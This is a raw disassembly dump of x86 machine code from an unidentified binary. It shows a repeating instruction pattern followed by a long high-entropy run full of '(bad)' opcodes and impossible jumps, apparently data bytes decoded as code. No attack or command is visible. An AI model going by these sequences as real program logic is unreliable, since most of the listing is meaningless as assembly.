  421b4e:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  421b52:	mov    bh,0xfb
  421b54:	sbb    bh,bl
  421b56:	jo     0x421b13
  421b58:	neg    DWORD PTR [eax-0x7a]
  421b5b:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  421b5f:	mov    bh,0xfb
  421b61:	sbb    bh,bl
  421b63:	jo     0x421b20
  421b65:	neg    DWORD PTR [eax-0x7a]
  421b68:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  421b6c:	mov    bh,0xfb
  421b6e:	sbb    bh,bl
  421b70:	jo     0x421b2d
  421b72:	neg    DWORD PTR [eax-0x7a]
  421b75:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  421b79:	mov    bh,0xfb
  421b7b:	sbb    bh,bl
  421b7d:	jo     0x421b3a
  421b7f:	neg    DWORD PTR [eax-0x7a]
  421b82:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  421b86:	mov    bh,0xfb
  421b88:	sbb    bh,bl
  421b8a:	jo     0x421b47
  421b8c:	neg    DWORD PTR [eax-0x7a]
  421b8f:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  421b93:	mov    bh,0xfb
  421b95:	sbb    bh,bl
  421b97:	jo     0x421b54
  421b99:	neg    DWORD PTR [eax-0x7a]
  421b9c:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  421ba0:	mov    bh,0xfb
  421ba2:	sbb    bh,bl
  421ba4:	jo     0x421b61
  421ba6:	neg    DWORD PTR [eax-0x7a]
  421ba9:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  421bad:	mov    bh,0xfb
  421baf:	sbb    bh,bl
  421bb1:	jo     0x421b6e
  421bb3:	neg    DWORD PTR [eax-0x7a]
  421bb6:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  421bba:	mov    bh,0xfb
  421bbc:	sbb    bh,bl
  421bbe:	jo     0x421b7b
  421bc0:	neg    DWORD PTR [eax-0x7a]
  421bc3:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  421bc7:	mov    bh,0xfb
  421bc9:	sbb    bh,bl
  421bcb:	jo     0x421b88
  421bcd:	neg    DWORD PTR [eax-0x7a]
  421bd0:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  421bd4:	mov    bh,0xfb
  421bd6:	sbb    bh,bl
  421bd8:	jo     0x421b95
  421bda:	neg    DWORD PTR [eax-0x7a]
  421bdd:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  421be1:	mov    bh,0xfb
  421be3:	sbb    bh,bl
  421be5:	jo     0x421ba2
  421be7:	neg    DWORD PTR [eax-0x7a]
  421bea:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  421bee:	mov    bh,0xfb
  421bf0:	sbb    bh,bl
  421bf2:	jo     0x421baf
  421bf4:	neg    DWORD PTR [eax-0x7a]
  421bf7:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  421bfb:	mov    bh,0xfb
  421bfd:	sbb    bh,bl
  421bff:	jo     0x421bbc
  421c01:	neg    DWORD PTR [eax-0x7a]
  421c04:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  421c08:	mov    bh,0xfb
  421c0a:	sbb    bh,bl
  421c0c:	jo     0x421bc9
  421c0e:	neg    DWORD PTR [eax-0x7a]
  421c11:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  421c15:	mov    bh,0xfb
  421c17:	sbb    bh,bl
  421c19:	jo     0x421bd6
  421c1b:	neg    DWORD PTR [eax-0x7a]
  421c1e:	fdiv   DWORD PTR [esi+ebp*8+0x37]
  421c22:	mov    bh,0xfb
  421c24:	sbb    bh,bl
  421c26:	jo     0x421be3
  421c28:	neg    DWORD PTR [eax-0x7a]
  421c2b:	fdiv   DWORD PTR [esi+ebp*8+0x58]
  421c2f:	pop    ds
  421c30:	lock sbb dl,ah
  421c33:	jo     0x421bf0
  421c35:	out    0x58,eax
  421c37:	xchg   dl,dh
  421c39:	(bad)  
  421c3a:	xor    al,0x46
  421c3c:	rol    DWORD PTR [edi+esi*1],1
  421c3f:	gs imul ebx
  421c42:	sbb    ch,BYTE PTR [esi+0x6e]
  421c45:	retf   
  421c46:	sar    BYTE PTR [ebx+0x51],0xc6
  421c4a:	jg     0x421c8c
  421c4c:	call   0x36232912
  421c51:	bound  edx,QWORD PTR [edx-0xb]
  421c54:	sub    BYTE PTR [ecx],bl
  421c56:	aad    0x6b
  421c58:	and    eax,0x46f443c2
  421c5d:	dec    edi
  421c5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c5f:	fcom   DWORD PTR [ebx+0x49]
  421c62:	mov    edi,0x5277aae2
  421c67:	inc    edx
  421c68:	xchg   BYTE PTR [edx],ch
  421c6a:	dec    esp
  421c6b:	aaa    
  421c6c:	mov    eax,0xc13307b
  421c71:	mov    bh,0xc9
  421c73:	ds pop edi
  421c75:	inc    ebx
  421c76:	imul   edx,DWORD PTR [edx+0x69],0x384d54bc
  421c7d:	inc    esi
  421c7e:	push   ecx
  421c7f:	aaa    
  421c80:	mov    esi,0x1ba6fd08
  421c85:	dec    eax
  421c86:	imul   esi,DWORD PTR [edx],0x7a2a4ac7
  421c8c:	inc    eax
  421c8d:	sbb    DWORD PTR [edi+0xf],esi
  421c90:	jne    0x421cfd
  421c92:	in     eax,dx
  421c93:	cmp    al,0x55
  421c95:	push   ds
  421c96:	push   esi
  421c97:	cmp    al,0x9b
  421c99:	mov    esp,0x5c5c5cef
  421c9e:	jo     0x421c6d
  421ca0:	aas    
  421ca1:	dec    ebx
  421ca2:	dec    esi
  421ca3:	sub    al,0xe8
  421ca5:	dec    ecx
  421ca6:	mov    al,ds:0xdec0ccbd
  421cab:	sbb    ch,BYTE PTR [eax-0x420bad9]
  421cb1:	add    ah,dh
  421cb3:	je     0x421d0e
  421cb5:	cs push es
  421cb7:	ficom  DWORD PTR [edx-0x3d]
  421cba:	sbb    al,0xe1
  421cbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421cbd:	mov    eax,0x8f099f84
  421cc2:	not    DWORD PTR [ebx+0x650004b5]
  421cc8:	pop    ecx
  421cc9:	sbb    al,0x3d
  421ccb:	cmp    ebp,DWORD PTR [edx+0x14764802]
  421cd1:	mov    ebp,0x34519ca8
  421cd6:	mov    eax,ds:0xf04d9b2f
  421cdb:	inc    ebx
  421cdc:	or     dl,BYTE PTR [edi-0x4df6569f]
  421ce2:	inc    esp
  421ce3:	sti    
  421ce4:	sbb    eax,0x9718eb0
  421ce9:	rol    BYTE PTR [ebp+0x244d9b65],0x7d
  421cf0:	lock mov ch,0x75
  421cf3:	es scas al,BYTE PTR es:[edi]
  421cf5:	fcomp  DWORD PTR [edi+0x9892814]
  421cfb:	lock and ah,BYTE PTR [eax]
  421cfe:	jmp    0x421d23
  421d00:	in     al,dx
  421d01:	pusha  
  421d02:	mov    BYTE PTR [esi+0x26acb0b5],0xcb
  421d09:	inc    DWORD PTR [ebx-0x76]
  421d0c:	and    BYTE PTR [ebx+0x19],dh
  421d0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d10:	cwde   
  421d11:	dec    esp
  421d12:	(bad)
  421d16:	xchg   edx,eax
  421d17:	adc    al,bl
  421d19:	out    0xb,eax
  421d1b:	xchg   edx,eax
  421d1c:	mov    bl,BYTE PTR [ebx+0x678403aa]
  421d22:	clc    
  421d23:	push   ss
  421d24:	xor    ch,BYTE PTR [esi]
  421d26:	xchg   ebx,eax
  421d27:	xchg   BYTE PTR [eax+0x12],dl
  421d2a:	dec    esp
  421d2b:	cmp    BYTE PTR [edi],ch
  421d2d:	arpl   WORD PTR [ebp-0x1f7d0d75],si
  421d33:	inc    eax
  421d34:	pop    edi
  421d35:	scas   al,BYTE PTR es:[edi]
  421d36:	jge    0x421d12
  421d38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d39:	mov    esp,0xb4991891
  421d3e:	enter  0x10f9,0x4a
  421d42:	mov    ecx,0x67e1d485
  421d47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d48:	mov    esp,eax
  421d4a:	(bad)  
  421d4b:	in     eax,dx
  421d4c:	or     ebp,DWORD PTR [esi]
  421d4e:	xchg   DWORD PTR [edi-0x32],edx
  421d51:	jmp    0xef9b4111
  421d56:	and    DWORD PTR [ebx+0x7eb8a01f],0x60
  421d5d:	aas    
  421d5e:	mov    cl,0x8a
  421d60:	or     al,0xd2
  421d62:	inc    eax
  421d63:	pop    ebp
  421d64:	xor    eax,0x2199d09f
  421d69:	pop    ebp
  421d6a:	or     al,cl
  421d6c:	inc    edx
  421d6d:	push   esi
  421d6e:	dec    ecx
  421d6f:	dec    eax
  421d70:	(bad)  
  421d72:	sbb    al,BYTE PTR [edx-0x7]
  421d75:	aaa    
  421d76:	cs cs daa 
  421d79:	imul   ecx,DWORD PTR [ecx+0x4572caac],0x62
  421d80:	pop    esi
  421d81:	inc    ebp
  421d82:	ret    
  421d83:	xor    eax,0xf920d786
  421d88:	jbe    0x421d40
  421d8a:	jo     0x421dab
  421d8c:	xor    ebp,DWORD PTR [eax]
  421d8e:	mov    ds:0x95df563f,eax
  421d93:	pusha  
  421d94:	lahf   
  421d95:	push   edi
  421d96:	(bad)  [edx+0x33]
  421d99:	test   edi,0x3896fde2
  421d9f:	pop    ecx
  421da0:	jge    0x421d3c
  421da2:	das    
  421da3:	aaa    
  421da4:	mov    ebx,0x319d72cb
  421da9:	aas    
  421daa:	push   edi
  421dab:	mov    al,0x4e
  421dad:	int    0x56
  421daf:	pushf  
  421db0:	clc    
  421db1:	lea    edx,[eax-0x47]
  421db4:	arpl   WORD PTR [edx-0x12a46c0b],bx
  421dba:	out    0x5d,eax
  421dbc:	mov    DWORD PTR [edi-0x7762a522],ecx
  421dc2:	dec    ecx
  421dc3:	mov    edx,DWORD PTR [edx-0x7c]
  421dc6:	(bad)  
  421dc7:	sub    bh,BYTE PTR [ecx+0x4d0310c]
  421dcd:	pushf  
  421dce:	lock icebp 
  421dd0:	(bad)  
  421dd1:	cmp    BYTE PTR [edx+0x419499db],al
  421dd7:	lods   al,BYTE PTR ds:[esi]
  421dd8:	in     eax,0x9b
  421dda:	or     BYTE PTR [ecx+0xe],cl
  421ddd:	xchg   edx,eax
  421dde:	cwde   
  421ddf:	lock xor eax,0x14de86dd
  421de5:	daa    
  421de6:	sbb    eax,0x2d5b4d4f
  421deb:	cmp    BYTE PTR [eax+0x4796290d],dh
  421df1:	ret    
  421df2:	(bad)  
  421df3:	mov    bl,ah
  421df5:	lahf   
  421df6:	sub    DWORD PTR [ecx+0x18],esi
  421df9:	mov    esi,0xdf7c3e0
  421dfe:	out    dx,eax
  421dff:	pop    edi
  421e00:	mov    al,0x38
  421e02:	push   ss
  421e03:	sub    DWORD PTR [eax],esp
  421e05:	xchg   edi,eax
  421e06:	cld    
  421e07:	out    0x61,al
  421e09:	inc    eax
  421e0a:	dec    esi
  421e0b:	(bad)  
  421e0c:	inc    ebx
  421e0d:	retf   
  421e0e:	cmp    BYTE PTR [edx+0x417295b3],ch
  421e14:	sbb    dl,BYTE PTR [ebx-0x53]
  421e17:	and    al,0x5e
  421e19:	xor    BYTE PTR [ecx],0x1b
  421e1c:	mov    dh,0x28
  421e1e:	test   al,0x29
  421e20:	add    al,cl
  421e22:	adc    BYTE PTR [ebx+0x71753d4],bh
  421e28:	sub    al,0x4e
  421e2a:	lahf   
  421e2b:	sbb    DWORD PTR [edi],edx
  421e2d:	push   ss
  421e2e:	in     eax,dx
  421e2f:	aaa    
  421e30:	cmp    DWORD PTR [ecx-0x69035503],ecx
  421e36:	mov    edi,0x3223007b
  421e3b:	lock pop esi
  421e3d:	hlt    
  421e3e:	xor    dh,BYTE PTR [edx-0x6c]
  421e41:	mov    ecx,0xc27104f1
  421e46:	add    edx,DWORD PTR [ecx+0x6c]
  421e49:	js     0x421ebc
  421e4b:	xchg   edx,eax
  421e4c:	or     DWORD PTR [edi+edi*2-0x3e],esp
  421e50:	and    eax,0xbe5454a6
  421e55:	call   0xcbc7c1ef
  421e5a:	in     al,dx
  421e5b:	pop    es
  421e5c:	lock (bad) 
  421e5e:	hlt    
  421e5f:	test   DWORD PTR [ecx+0x1b],0x7fd50d6c
  421e66:	mov    esi,0x89affbc6
  421e6b:	aam    0x8f
  421e6d:	pop    es
  421e6e:	jb     0x421eb4
  421e70:	ins    DWORD PTR es:[edi],dx
  421e71:	pusha  
  421e72:	xchg   ecx,ebx
  421e74:	retf   
  421e75:	data16 test al,0xe1
  421e78:	stos   BYTE PTR es:[edi],al
  421e79:	sub    bl,dh
  421e7b:	stos   BYTE PTR es:[edi],al
  421e7c:	cdq    
  421e7d:	sbb    dh,BYTE PTR [edx+0xfd78060]
  421e83:	inc    ebp
  421e84:	ja     0x421e17
  421e86:	pop    ebx
  421e88:	mov    ds:0x59b5a0d3,eax
  421e8d:	rol    BYTE PTR [eax+edi*2],1
  421e90:	mov    cl,0xa6
  421e92:	xchg   DWORD PTR [ecx+0x7f],edx
  421e95:	out    0x4d,al
  421e97:	clc    
  421e98:	xsha1  (bad)
  421e99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e9a:	(bad)  
  421e9b:	out    dx,al
  421e9c:	outs   dx,DWORD PTR ds:[esi]
  421e9d:	lea    ecx,[eax]
  421e9f:	push   eax
  421ea0:	add    bh,BYTE PTR [ecx-0x7151f0f1]
  421ea6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ea7:	(bad)  
  421ea8:	fucomip st,st(4)
  421eaa:	and    DWORD PTR [edi+0x18],edi
  421ead:	and    al,dh
  421eaf:	xchg   edi,eax
  421eb0:	or     al,0x47
  421eb2:	dec    ebx
  421eb3:	sbb    BYTE PTR [edi],dl
  421eb5:	or     al,0x4e
  421eb7:	in     eax,0x8d
  421eb9:	mov    ds:0x16376159,eax
  421ebe:	jae    0x3fe93576
  421ec4:	ds jge 0x421e96
  421ec7:	inc    ebx
  421ec8:	sahf   
  421ec9:	or     BYTE PTR [ecx+edx*8+0x5ecadfe8],bl
  421ed0:	cmp    esi,ecx
  421ed2:	shl    dh,1
  421ed4:	push   esi
  421ed5:	adc    ch,BYTE PTR [ebp+0x70]
  421ed8:	push   es
  421ed9:	outs   dx,BYTE PTR ds:[esi]
  421eda:	repnz icebp 
  421edc:	push   edx
  421edd:	outs   dx,BYTE PTR ds:[esi]
  421ede:	xor    ax,0xbabe
  421ee2:	repnz sar DWORD PTR [eax+0x3d11b44f],1
  421ee9:	mov    esp,DWORD PTR [eax]
  421eeb:	inc    edx
  421eec:	pop    es
  421eed:	sbb    al,0xe0
  421eef:	push   0x1e
  421ef1:	addr16 ret 0x9692
  421ef5:	or     esi,DWORD PTR [ebp+0x30f9a362]
  421efb:	adc    cl,cl
  421efd:	mov    ds:0x5a93ec63,eax
  421f02:	xchg   edi,eax
  421f03:	pusha  
  421f04:	movq   mm7,QWORD PTR [ebx+edx*1-0x1524f2ff]
  421f0c:	jle    0x421eed
  421f0e:	add    BYTE PTR [edx],0xa2
  421f11:	cmp    ecx,0x57
  421f14:	sbb    al,bh
  421f16:	mov    DWORD PTR [ebx-0x4f0f57eb],ebp
  421f1c:	jns    0x421f5a
  421f1e:	scas   al,BYTE PTR es:[edi]
  421f1f:	jmp    0x8df346d
  421f24:	mov    es,WORD PTR [esp+eax*1]
  421f27:	test   eax,0xec5ad1bc
  421f2c:	add    al,0xec
  421f2e:	sbb    DWORD PTR [edx-0xe],0x77d36e13
  421f35:	inc    ebp
  421f36:	cdq    
  421f37:	scas   eax,DWORD PTR es:[edi]
  421f38:	pop    ss
  421f39:	push   es
  421f3a:	aas    
  421f3b:	nop
  421f3c:	imul   ebp,esp,0x25
  421f3f:	shl    DWORD PTR [ebx],0x8b
  421f42:	fcmovnb st,st(5)
  421f44:	cli    
  421f45:	pop    ebp
  421f46:	xor    eax,0xcdb983
  421f4b:	jno    0x421fb3
  421f4d:	scas   al,BYTE PTR es:[edi]
  421f4e:	in     eax,0x9e
  421f50:	add    esi,eax
  421f52:	mov    bh,0x20
  421f54:	scas   eax,DWORD PTR es:[edi]
  421f55:	pop    eax
  421f56:	lahf   
  421f57:	aaa    
  421f58:	std    
  421f59:	pushf  
  421f5a:	fiadd  WORD PTR [edi]
  421f5c:	daa    
  421f5d:	push   cs
  421f5e:	add    eax,0x8f504527
  421f63:	xor    DWORD PTR [esi+edx*8-0x54],esi
  421f67:	popf   
  421f68:	stc    
  421f69:	xchg   ecx,eax
  421f6a:	pop    edx
  421f6b:	lahf   
  421f6c:	jmp    0x26ad94da
  421f71:	push   esi
  421f72:	mov    ebp,0x9a675b27
  421f77:	inc    edi
  421f78:	das    
  421f79:	leave  
  421f7a:	loopne 0x421f0b
  421f7c:	repz loop 0x421f67
  421f7f:	and    al,0xec
  421f81:	add    BYTE PTR [eax],bh
  421f83:	jne    0x421fa6
  421f85:	stos   BYTE PTR es:[edi],al
  421f86:	xor    al,0x72
  421f88:	pop    ds
  421f89:	pusha  
  421f8a:	xlat   BYTE PTR ds:[ebx]
  421f8b:	xchg   esp,eax
  421f8c:	lahf   
  421f8d:	mov    WORD PTR [esi],ss
  421f8f:	or     BYTE PTR [eax+0x40],al
  421f92:	xor    ch,dl
  421f94:	out    0x38,al
  421f96:	add    DWORD PTR [ecx],ecx
  421f98:	adc    al,0x81
  421f9a:	js     0x421ffc
  421f9c:	inc    ecx
  421f9d:	sar    DWORD PTR [ebx],1
  421f9f:	xor    edx,eax
  421fa1:	jmp    0x42f4032d
  421fa6:	test   BYTE PTR [edx+0x3777fccc],bl
  421fac:	out    0x42,al
  421fae:	aas    
  421faf:	cld    
  421fb0:	mov    edx,0x9d794aa7
  421fb5:	fs dec esp
  421fb7:	adc    eax,0x9187b62
  421fbc:	mov    esp,0xa0c7620
  421fc1:	mov    al,ds:0xdc12e43b
  421fc6:	add    eax,0xea56bc72
  421fcb:	sbb    BYTE PTR [ebp+0x5a],al
  421fce:	out    0x55,al
  421fd0:	push   ds
  421fd1:	and    eax,0x7d02953d
  421fd6:	mov    ebp,0x95215bda
  421fdb:	fwait
  421fdc:	lods   eax,DWORD PTR ds:[esi]
  421fdd:	sub    al,0x3b
  421fdf:	push   0x4b
  421fe1:	add    cl,BYTE PTR [ebx]
  421fe3:	out    dx,eax
  421fe4:	data16 sub BYTE PTR [ebx],cl
  421fe7:	mov    BYTE PTR [esi+0xc8be443],al
  421fed:	or     eax,0xbf6f642c
  421ff2:	inc    ecx
  421ff3:	jge    0x421ff8
  421ff5:	and    al,0x41
  421ff7:	dec    esp
  421ff8:	loop   0x422071
  421ffa:	cld    
  421ffb:	sub    ah,BYTE PTR [edi+0x43]
  421ffe:	and    ecx,ebp
  422000:	sbb    ah,dh
  422002:	mov    cl,cl
  422004:	add    BYTE PTR [ebp+0x5c],cl
  422007:	push   cs
  422008:	mov    edi,0x151719af
  42200d:	mov    ebp,0xc9f084e5
  422012:	jg     0x421fd0
  422014:	mov    cl,0xa5
  422016:	and    DWORD PTR [esp+eax*1],0x22
  42201a:	mov    ds:0x6633df69,eax
  42201f:	mov    bh,0x7c
  422021:	mov    eax,ds:0xc63d98a2
  422026:	sbb    ah,al
  422028:	shr    bh,cl
  42202a:	mov    ds:0xc2c19f68,eax
  42202f:	arpl   di,si
  422031:	adc    al,ch
  422033:	xor    eax,0xe24acb64
  422038:	cli    
  422039:	(bad)  
  42203a:	fimul  WORD PTR [edi-0x3aa2d093]
  422040:	sub    eax,0x20c306f5
  422045:	out    dx,al
  422046:	mov    dl,0x7d
  422048:	lahf   
  422049:	and    ecx,eax
  42204b:	push   ebx
  42204c:	adc    DWORD PTR [edi],ecx
  42204e:	sbb    al,0x61
  422050:	scas   al,BYTE PTR es:[edi]
  422051:	jp     0x42205b
  422053:	or     eax,0x8a51cd5c
  422058:	lods   al,BYTE PTR ds:[esi]
  422059:	fnstenv [esi+0xf]
  42205c:	adc    ah,BYTE PTR [eax+0x736ee263]
  422062:	mov    cl,0x99
  422064:	lea    ebx,[ebp+0x52b776ec]
  42206a:	dec    ebx
  42206b:	and    al,0xc7
  42206d:	retf   
  42206e:	add    al,0x96
  422070:	jge    0x4220ea
  422072:	test   eax,0xe11d4383
  422077:	sub    edi,DWORD PTR [edi-0x7d9b0f18]
  42207d:	les    edi,FWORD PTR [ecx+0x1381a35d]
  422083:	in     eax,dx
  422084:	(bad)  
  422085:	push   edi
  422086:	cmp    ebp,DWORD PTR [eax+0x9]
  422089:	loop   0x42202e
  42208b:	mov    edx,0x36d4ed2d
  422090:	or     cl,dh
  422092:	jge    0x4220a2
  422094:	icebp  
  422095:	test   al,0x73
  422097:	out    0x32,eax
  422099:	mov    al,ds:0x91cd90bd
  42209e:	mov    ss,ebx
  4220a0:	pop    eax
  4220a1:	inc    ebx
  4220a2:	test   DWORD PTR [esi+eiz*8-0x2a249403],ecx
  4220a9:	mov    ds:0xe3e83b36,al
  4220ae:	fbstp  TBYTE PTR [ebx-0x65]
  4220b1:	iret   
  4220b2:	add    BYTE PTR [ecx-0x74dc8f9a],bl
  4220b8:	dec    ebx
  4220b9:	push   edx
  4220ba:	jmp    0xeddb:0xb773f687
  4220c1:	adc    BYTE PTR [edx+0x79efe95c],cl
  4220c7:	xchg   edx,eax
  4220c8:	cmp    ecx,DWORD PTR [edx-0x2cb52bab]
  4220ce:	arpl   si,sp
  4220d0:	loope  0x42205d
  4220d2:	rol    ch,1
  4220d4:	mov    ds:0x7b4ba6c1,al
  4220d9:	add    cl,ch
  4220db:	enter  0xd41d,0x1c
  4220df:	add    eax,0x6a534697
  4220e4:	scas   al,BYTE PTR es:[edi]
  4220e5:	cwde   
  4220e6:	ret    0xf823
  4220e9:	pop    edi
  4220ea:	and    eax,0x8bda8664
  4220ef:	push   ecx
  4220f0:	imul   esp,DWORD PTR [eax+0x4b],0xe6d1b320
  4220f7:	and    ebp,DWORD PTR [edi]
  4220f9:	jae    0x42209e
  4220fb:	sub    cl,al
  4220fd:	mov    eax,0x34f6731
  422102:	cmp    cl,BYTE PTR [ebp-0x4d2c12d8]
  422108:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422109:	xor    eax,0x42d2fa93
  42210e:	call   0x41f3:0x6be2c5ad
  422115:	and    esp,DWORD PTR [ebp+eiz*8-0x440a8e93]
  42211c:	mov    edi,0xf22e49
  422121:	into   
  422122:	mov    cl,0xe
  422124:	jno    0x422147
  422126:	je     0x4220f7
  422128:	mov    ebp,0xd6cb9226
  42212d:	xchg   edx,eax
  42212e:	pop    ss
  42212f:	mov    edx,0x90fa80e9
  422134:	arpl   dx,si
  422136:	cli    
  422137:	std    
  422138:	sub    ah,dh
  42213a:	cmp    eax,ebp
  42213c:	jae    0x42217a
  42213e:	xchg   ebx,eax
  42213f:	cs in  eax,dx
  422141:	sti    
  422142:	xchg   edx,eax
  422143:	cmp    DWORD PTR [ebx+0x45],0xfffffff4
  422147:	rol    DWORD PTR [ebx],cl
  422149:	add    DWORD PTR [ebp+0x6c],edx
  42214c:	xchg   DWORD PTR [ebx+0x21e1fefa],esi
  422152:	and    DWORD PTR [esi-0x1f],edx
  422155:	div    BYTE PTR [ebx+ebx*2+0x59b5d5ab]
  42215c:	sahf   
  42215d:	dec    esi
  42215e:	sbb    al,0x8b
  422160:	idiv   DWORD PTR ds:0x8f50bac9
  422166:	pop    edx
  422167:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422168:	pop    ebx
  422169:	mov    ecx,0xb119fa07
  42216e:	or     eax,0x89ed88a4
  422173:	test   DWORD PTR [ebx+0x3708c913],eax
  422179:	xor    bh,BYTE PTR [esi]
  42217b:	adc    dl,cl
  42217d:	popa   
  42217e:	mov    edx,ebx
  422180:	pusha  
  422181:	loopne 0x42212e
  422183:	cwde   
  422184:	pop    es
  422185:	mov    BYTE PTR [edx+0x4a4d4196],ch
  42218b:	cmp    eax,0x1b11023d
  422190:	add    BYTE PTR [esi+0x10],al
  422193:	jnp    0x42219b
  422195:	xchg   ebx,ecx
  422197:	cli    
  422198:	jmp    0x422198
  42219a:	arpl   cx,sp
  42219c:	xlat   BYTE PTR ds:[ebx]
  42219d:	dec    esp
  42219e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42219f:	mov    eax,0x99adc87c
  4221a4:	in     al,dx
  4221a5:	push   edi
  4221a6:	in     eax,dx
  4221a7:	mov    al,0x90
  4221a9:	ds push ebx
  4221ab:	sub    edx,DWORD PTR [esi-0x698700a4]
  4221b1:	adc    DWORD PTR [ecx+0x4e674c05],eax
  4221b7:	out    0xfe,eax
  4221b9:	out    dx,al
  4221ba:	mov    ds:0x1ab71000,al
  4221bf:	mov    ebx,0xc2087583
  4221c4:	sbb    DWORD PTR [eax],eax
  4221c6:	and    eax,0x6db3ed96
  4221cb:	jno    0x4221a0
  4221cd:	cmp    eax,DWORD PTR [eax+ecx*4+0x1b8d251a]
  4221d4:	jge    0x422170
  4221d6:	xchg   esi,eax
  4221d7:	stos   BYTE PTR es:[edi],al
  4221d8:	jmp    0x4221fc
  4221da:	ss pop eax
  4221dc:	div    DWORD PTR [edx-0x374f3557]
  4221e2:	sti    
  4221e3:	scas   eax,DWORD PTR es:[edi]
  4221e4:	(bad)
  4221e7:	jmp    FWORD PTR [eax]
  4221e9:	fadd   QWORD PTR [edx-0x58]
  4221ec:	mov    ds:0x90ece182,eax
  4221f1:	jle    0x4221f7
  4221f3:	cwde   
  4221f4:	cmc    
  4221f5:	and    BYTE PTR [ebp-0x53],al
  4221f8:	jle    0x4221ab
  4221fa:	stc    
  4221fb:	gs lock push ecx
  4221fe:	gs xchg ecx,eax
  422200:	(bad)  
  422201:	pusha  
  422202:	test   dl,ch
  422204:	pop    esi
  422205:	and    BYTE PTR [ebp+0x2dd4d59d],al
  42220b:	sub    al,0x62
  42220d:	fwait
  42220e:	and    ah,BYTE PTR [ebx]
  422210:	mov    cl,0xfd
  422212:	frstor [edx]
  422214:	out    0xe3,eax
  422216:	xor    ebx,ebp
  422218:	or     ebx,DWORD PTR [ebx+0x18add311]
  42221e:	js     0x422255
  422220:	fs sub dl,0x57
  422224:	or     DWORD PTR [esp+eax*2-0x4553c019],eax
  42222b:	rcl    DWORD PTR [edx+0x3286a44],cl
  422231:	test   BYTE PTR [esi-0x716f2fc7],al
  422237:	cdq    
  422238:	mov    al,0x9a
  42223a:	sar    DWORD PTR [edi],cl
  42223c:	imul   esi,DWORD PTR [eax],0xc
  42223f:	mov    esp,0x71a9f4f5
  422244:	lahf   
  422245:	popa   
  422246:	adc    eax,0xaa585dbb
  42224b:	ja     0x422283
  42224d:	inc    edi
  42224e:	jo     0x4222cd
  422250:	pop    esp
  422251:	iret   
  422252:	jo     0x422284
  422254:	dec    ebp
  422255:	es mov edx,0xe266f1c5
  42225b:	xlat   BYTE PTR ds:[ebx]
  42225c:	sti    
  42225d:	xor    BYTE PTR [edx+eax*8+0x25a69bca],al
  422264:	mov    ebx,DWORD PTR [ecx+0x62cced1f]
  42226a:	add    DWORD PTR [ebx+eax*1+0x1],0x5d4db944
  422272:	or     cl,BYTE PTR [eax-0x55a4ff16]
  422278:	int3   
  422279:	das    
  42227a:	lahf   
  42227b:	xlat   BYTE PTR ds:[ebx]
  42227c:	push   edx
  42227d:	push   esi
  42227e:	mov    DWORD PTR [ebx],eax
  422280:	sbb    edx,eax
  422282:	cmp    DWORD PTR [ebx+edx*4-0x7d6c8810],edx
  422289:	arpl   WORD PTR [eax-0x10],dx
  42228c:	push   ebx
  42228d:	sti    
  42228e:	call   0xd3ce9d81
  422293:	sbb    ebp,DWORD PTR [ebx+0x42]
  422296:	jne    0x42229a
  422298:	add    bl,BYTE PTR [ecx+0x6ed2fe09]
  42229e:	or     al,0xd8
  4222a0:	sbb    DWORD PTR [ecx+esi*2+0x63],ebp
  4222a4:	das    
  4222a5:	call   0xe98f:0x90c9a740
  4222ac:	push   edi
  4222ad:	shl    DWORD PTR [edx+0x5a],cl
  4222b0:	stos   BYTE PTR es:[edi],al
  4222b1:	push   0xffffffaf
  4222b3:	push   edx
  4222b4:	push   sp
  4222b6:	outs   dx,BYTE PTR ds:[esi]
  4222b7:	adc    BYTE PTR [esi],0x76
  4222ba:	or     dh,BYTE PTR [ebx]
  4222bc:	in     al,dx
  4222bd:	dec    esp
  4222be:	jge    0x42227c
  4222c0:	test   al,0x1e
  4222c2:	mov    eax,ds:0x61267810
  4222c7:	or     DWORD PTR [edx+0x60a41b50],edi
  4222cd:	pop    esp
  4222ce:	call   0x549df6a9
  4222d3:	xor    BYTE PTR [esi-0x132cd23d],bl
  4222d9:	lahf   
  4222da:	mov    ebx,0x4f3377d8
  4222df:	sub    BYTE PTR [ebx+0x607826e0],0xe1
  4222e6:	push   ebp
  4222e7:	retf   0xa9ca
  4222ea:	mov    ds:0x6aa23712,al
  4222ef:	mov    cl,0xf3
  4222f1:	out    0x4c,eax
  4222f3:	cld    
  4222f4:	xor    BYTE PTR [ebx],0x28
  4222f7:	rol    DWORD PTR [ebx-0x57bfb42b],0x41
  4222fe:	std    
  4222ff:	inc    edx
  422300:	push   ebx
  422301:	xor    eax,0x3966e496
  422306:	fisub  DWORD PTR [edx-0x35]
  422309:	dec    ecx
  42230a:	cld    
  42230b:	daa    
  42230c:	fwait
  42230d:	ja     0x422357
  42230f:	mov    edi,0x4f4cc7c3
  422314:	enter  0x293e,0xf9
  422318:	cmp    eax,0x914af510
  42231d:	gs dec esp
  42231f:	adc    eax,0xcff8587
  422324:	inc    ebx
  422325:	cmp    al,0x7c
  422327:	addr16 sub eax,ebp
  42232a:	pusha  
  42232b:	jne    0x42233c
  42232d:	dec    ecx
